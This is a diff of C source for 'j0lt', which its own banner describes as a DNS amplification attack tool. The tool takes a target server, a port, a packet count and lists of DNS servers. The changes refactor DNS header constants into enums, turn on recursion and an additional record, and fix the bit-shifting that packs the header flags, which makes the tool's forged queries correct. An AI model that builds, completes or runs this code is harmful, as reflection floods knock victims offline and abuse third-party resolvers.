@@ -1,5 +1,7 @@
 /*
  * ref: rfc 1034 & 1035
+ * sudo tcpdump -X -n udp port 53
+ *
  * ./j0lt <resolver> <resolver port> <target>
  */
 
@@ -21,24 +23,7 @@
 #include <netdb.h>
 #include <unistd.h>
 
-const char* g_ansi = {
- " Usage: sudo ./j0lt [OPTION]...          \n"
- "                                         \n"
- "-d <dst>        : target server          \n"
- "-p <port>       : target port            \n"
- "-n <num>        : num UDP packets to send\n"
- "-r <dns rcrd>   : list of dns records    \n"
- "-s <dns srv>    : list of dns servers    \n"
- "-P <dns port>   : dns port (53)          \n"
- "                                         \n"
- " w3lc0m3 t0 j0lt                         \n"
- " a DNS amplification attack tool         \n"
- "                                         \n"
- "                            the-scientist\n"
- "                       tofu@rootstorm.com\n\n"
-};
-
-#ifndef __BYTE_ORDER 
+#ifndef __BYTE_ORDER
 #define 	__LITTLE_ENDIAN 0x1
 #define 	__BYTE_ORDER __LITTLE_ENDIAN
 #endif // __BYTE_ORDER
@@ -47,31 +32,38 @@ const char* g_ansi = {
 #define 	ID 0x1337
 #define 	QR 0 // query (0), response (1).
 // OPCODE VALS 
-#define 	OP_QUERY  0 // standard query (QUERY)
-#define 	OP_IQUERY 1 // inverse query (IQUERY)
-#define 	OP_STATUS 2 // server status (STATUS)
-#define 	OPCODE    OP_QUERY
+typedef enum __opcode__ {
+    OP_QUERY = 0,
+    OP_IQUERY = 1,
+    OP_STATUS = 2,
+    OP_NOTIFY = 3,
+    OP_UPDATE = 4
+} opcode;
+#define 	OPCODE OP_QUERY
 // END OPCODE
 #define 	AA 0 // Authoritative Answer
 #define 	TC 0 // TrunCation
-#define 	RD 0 // Recursion Desired 
+#define 	RD 1 // Recursion Desired 
 #define 	RA 0 // Recursion Available
 #define 	Z  0 // Reserved
-#define 	AD 0 // dns sec
-#define 	CD 1 // dns sec
+#define 	AD 1 // Authentic Data (DNS-SEC)
+#define 	CD 0 // Checking Disabled (DNS-SEC)
 // RCODE
-#define 	RC_NO_ER   0
-#define 	RC_FMT_ERR 1
-#define 	RC_SRVR_FA 2
-#define 	RC_NAME_ER 3
-#define 	RC_NOT_IMP 4
-#define 	RC_REFUSED 5
-#define 	RCODE      RC_NO_ER
+typedef enum __rcode__ {
+    RC_NO_ER = 0,
+    RC_FMT_ERR = 1,
+    RC_SRVR_FA = 2,
+    RC_NAME_ER = 3,
+    RC_NOT_IMP = 4,
+    RC_REFUSED = 5
+} rcode;
+#define 	RCODE RC_NO_ER
 // END RCODE
-#define 	QDCOUNT 0x0001 // num entry question
-#define 	ANCOUNT 0x0000 // num RR answer
-#define 	NSCOUNT 0x0000 // num NS RR 
-#define 	ARCOUNT 0x0000 // num RR additional
+
+#define 	QDCOUNT 1 // num entry question
+#define 	ANCOUNT 0 // num RR answer
+#define 	NSCOUNT 0 // num NS RR 
+#define 	ARCOUNT 1 // num RR additional
 // END HEADER VALUES
 
 struct __attribute__((packed, aligned(1))) J0LT_HEADER
@@ -79,68 +71,76 @@ struct __attribute__((packed, aligned(1))) J0LT_HEADER
     uint16_t	id : 16;
 #if __BYTE_ORDER == __BIG_ENDIAN
     // third byte
-    uint16_t	qr : 1;
-    uint16_t	opcode : 4;
-    uint16_t	aa : 1;
-    uint16_t	tc : 1;
-    uint16_t	rd : 1;
+    uint8_t	    qr : 1;
+    uint8_t	    opcode : 4;
+    uint8_t	    aa : 1;
+    uint8_t	    tc : 1;
+    uint8_t	    rd : 1;
     // fourth byte
-    uint16_t	ra : 1;
-    uint16_t	z : 1;
-    uint16_t	ad : 1;
-    uint16_t	cd : 1;
-    uint16_t	rcode : 4;
+    uint8_t	    ra : 1;
+    uint8_t	    z : 1;
+    uint8_t	    ad : 1;
+    uint8_t	    cd : 1;
+    uint8_t	    rcode : 4;
 #endif
+
 #if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
     // third byte
-    uint16_t	rd : 1;
-    uint16_t	tc : 1;
-    uint16_t	aa : 1;
-    uint16_t	opcode : 4;
-    uint16_t	qr : 1;
+    uint8_t	    rd : 1;
+    uint8_t	    tc : 1;
+    uint8_t	    aa : 1;
+    uint8_t	    opcode : 4;
+    uint8_t	    qr : 1;
     // fourth byte
-    uint16_t	rcode : 4;
-    uint16_t	cd : 1;
-    uint16_t	ad : 1;
-    uint16_t	z : 1;
-    uint16_t	ra : 1;
+    uint8_t     rcode : 4;
+    uint8_t     cd : 1;
+    uint8_t     ad : 1;
+    uint8_t     z : 1;
+    uint8_t     ra : 1;
 #endif
     // remaining bytes
-    uint16_t	qdcount : 16;
-    uint16_t	ancount : 16;
-    uint16_t	nscount : 16;
-    uint16_t	arcount : 16;
+    uint16_t    qdcount : 16;
+    uint16_t    ancount : 16;
+    uint16_t    nscount : 16;
+    uint16_t    arcount : 16;
 };
 
 // TYPE
-#define 	T_A      1 // host address
-#define 	T_NS     2 // authoritative name server
-#define 	T_MD     3 // mail destination
-#define 	T_MF     4 // mail forwarder
-#define 	T_CNAME  5 // canonical name for alias
-#define 	T_SOA    6 // start of zone authority
-#define 	T_MB     7 // mailbox domain name
-#define 	T_MG     8 // mail group member
-#define 	T_MR     9 // mail rename domain name
-#define 	T_NULL   10 // null RR
-#define 	T_WKS    11 // service description
-#define 	T_PTR    12 // a domain name pointer
-#define 	T_HINFO  13 // host information
-#define 	T_MINFO  14 // mail list information
-#define 	T_MX     15 // mail exchange
-#define 	T_TXT    16 // text strings
-#define 	QT_AXFR  252 // transfer of entire zone
-#define 	QT_MAILB 253 // mailbox records 
-#define 	QT_MAILA 254 // req mail agent RRs
-#define 	QT_ALL   255 // req all records
-#define 	QTYPE    T_A
+typedef enum __type__ {
+    T_A = 1,// host address
+    T_NS = 2,// authoritative name server
+    T_MD = 3,// mail destination
+    T_MF = 4,// mail forwarder
+    T_CNAME = 5,// canonical name for alias
+    T_SOA = 6,// start of zone authority
+    T_MB = 7,// mailbox domain name
+    T_MG = 8,// mail group member
+    T_MR = 9,// mail rename domain name
+    T_NULL = 10, // null RR
+    T_WKS = 11, // service description
+    T_PTR = 12, // a domain name pointer
+    T_HINFO = 13, // host information
+    T_MINFO = 14, // mail list information
+    T_MX = 15, // mail exchange
+    T_TXT = 16, // text strings
+    QT_AXFR = 252, // transfer of entire zone
+    QT_MAILB = 253, // mailbox records 
+    QT_MAILA = 254, // req mail agent RRs
+    QT_ALL = 255 // req all records
+} type;
+#define 	QTYPE T_A
+// END TYPE
+
 // CLASS values
-#define 	C_IN   1 // the Internet
-#define 	C_CS   2 // the CSNET class
-#define 	C_CH   3 // the CHAOS class
-#define 	C_HS   4 // Hesiod [Dyer 87]
-#define 	QC_ALL 255 // anyclass
-#define 	QCLASS C_IN
+typedef enum __class__ {
+    C_IN = 1, // the Internet
+    C_CS = 2, // the CSNET class
+    C_CH = 3, // the CHAOS class
+    C_HS = 4, // Hesiod [Dyer 87]
+    QC_ALL = 255, // anyclass
+} class;
+#define     QCLASS C_IN
+// END CLASS 
 
 #define DEFINE_INSERT_FN(typename, datatype)        \
     bool insert_##typename                          \
@@ -172,11 +172,11 @@ struct __attribute__((packed, aligned(1))) J0LT_HEADER
 	    byte_pos -= (2 << 3);                       \
 	}                                               \
                                                     \
-	data = bigendian_data == 0 ?			        \
+	data = bigendian_data == 0 ?                    \
 	    data : bigendian_data;                      \
 	for (int i = sizeof(data);                      \
-	     *buflen != -1 && i > 0; i--) {		        \
-	    *(*buf)++ = (data & 0xff);			        \
+	     *buflen != -1 && i > 0; i--) {             \
+	    *(*buf)++ = (data & 0xff);                  \
 	    data >>= 8;                                 \
 	    (*buflen)--;                                \
 	}                                               \
@@ -192,6 +192,23 @@ DEFINE_INSERT_FN(qword, uint64_t)
 
 #define 	DEBUG   1
 #define 	BUF_MAX 0x200
+
+const char* g_ansi = {
+ " Usage: sudo ./j0lt [OPTION]...          \n"
+ "                                         \n"
+ "-d <dst>        : target server          \n"
+ "-p <port>       : target port            \n"
+ "-n <num>        : num UDP packets to send\n"
+ "-r <dns rcrd>   : list of dns records    \n"
+ "-s <dns srv>    : list of dns servers    \n"
+ "-P <dns port>   : dns port (53)          \n"
+ "                                         \n"
+ " w3lc0m3 t0 j0lt                         \n"
+ " a DNS amplification attack tool         \n"
+ "                                         \n"
+ "                            the-scientist\n"
+ "                       tofu@rootstorm.com\n\n"
+};
 
 int
 connect_client(const char* server, const char* port,
@@ -221,13 +238,13 @@ main(int argc, char** argv)
     size_t buflen = BUF_MAX;
     uint8_t pktbuf[ BUF_MAX ];
     struct J0LT_HEADER header = {
-    ID,
-    RD, TC, AA, OPCODE, QR,
-    RCODE, CD, AD, Z, RA,
-    QDCOUNT,
-    ANCOUNT,
-    NSCOUNT,
-    ARCOUNT
+        ID,
+        RD, TC, AA, OPCODE, QR,
+        RCODE, CD, AD, Z, RA,
+        QDCOUNT,
+        ANCOUNT,
+        NSCOUNT,
+        ARCOUNT
     };
 
     printf("%s", g_ansi);
@@ -305,13 +322,21 @@ insert_header(uint8_t** buf, size_t*
     bool status;
     uint8_t third_byte, fourth_byte;
 
-    third_byte = (header->rd | header->tc |
-           header->aa | header->opcode |
-           header->qr);
+    third_byte = (
+                    header->rd |
+                    header->tc << 1 |
+                    header->aa << 2 |
+                    header->opcode << 3 |
+                    header->qr << 7
+                );
 
-    fourth_byte = (header->rcode | header->cd |
-           header->ad | header->z |
-           header->ra);
+    fourth_byte = (
+                    header->rcode |
+                    header->cd << 4 |
+                    header->ad << 5 |
+                    header->z << 6 |
+                    header->ra << 7
+                );
 
     status = true;
     status &= insert_word(buf, buflen, header->id);
